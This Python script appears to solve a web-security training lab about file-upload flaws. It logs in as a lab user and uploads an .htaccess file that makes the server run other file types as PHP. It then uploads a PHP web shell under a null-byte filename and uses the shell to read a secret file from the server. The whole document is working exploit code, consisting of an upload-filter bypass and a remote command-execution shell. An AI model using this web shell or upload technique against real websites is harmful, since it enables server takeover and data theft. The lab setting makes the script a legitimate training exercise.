import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import random
import string
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf(url:str, s:requests.Session):
    try:
        r = s.get(url, verify=False, proxies=proxies, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input", {'name':'csrf'})['value']
        return csrf
    except requests.exceptions.RequestException as ex:
        print(f"Error {ex}")
        return None

def login(url:str, s:requests.Session, csrf:str):
    login_url = url + '/login'
    login_data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
    try:
        r = s.post(login_url, login_data, verify=False, proxies=proxies, timeout=5)
        response = r.text
        if 'Log out' in response:
            print("Logged in successfully")
            return True
        else:
            print("Failed to log in")
            return False
    except requests.exceptions.RequestException as ex:
        print(f"Error: {ex}")
        return False

def upload_web_shell(url:str, s:requests.Session):
    # Requires a new csrf token
    csrf = get_csrf(url + '/my-account?id=wiener', s)
    
    # upload .htaccess file first that will make the server interprete .test files as php files
    params = {'avatar': ('.htaccess', "AddType application/x-httpd-php .test", 'application/octet-stream'),
              'user': 'wiener',
              'csrf': csrf}
    
    #Boundaries starts with ------geckoformboundary then a random 16 characters
    boundary = '------geckoformboundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))

    m = MultipartEncoder(fields=params, boundary=boundary)
    header = {'Content-Type': m.content_type}

    r = s.post(url + '/my-account/avatar', data = m, headers=header, proxies=proxies, verify=False) 
    
        # upload web shell file as .test
    params = {'avatar': ('2.php%00.jpg', "<?php echo system($_GET['command']); ?>", 'application/octet-stream'),
              'user': 'wiener',
              'csrf': csrf}
    
    m = MultipartEncoder(fields=params, boundary=boundary)
    header = {'Content-Type': m.content_type}

    r = s.post(url + '/my-account/avatar', data = m, headers=header, proxies=proxies, verify=False) 

    print("Accessing secret file")
    
    req = s.get(url + '/files/avatars/2.php?command=' + 'cat /home/carlos/secret', verify=False, proxies=proxies)
    if req.status_code == 200:
        print(req.text)
        return True
    else:
        print("Failed to read secret file")
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Script Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} example.com")
        sys.exit(-1)

    url = sys.argv[1]
    if url.endswith('/'):
        url = url.removesuffix('/')
    
    s = requests.Session()
    csrf = get_csrf(url + '/login', s)
    if not csrf:
        print("Could not find csrf token")
        sys.exit(-1)
    
    print("Logging in as wiener")
    if not login(url, s, csrf):
        sys.exit(-1)
    
    if upload_web_shell(url, s):
        print("Lab Solved!")
        sys.exit(0)
    else:
        sys.exit(-1)

if __name__ == '__main__':
    main()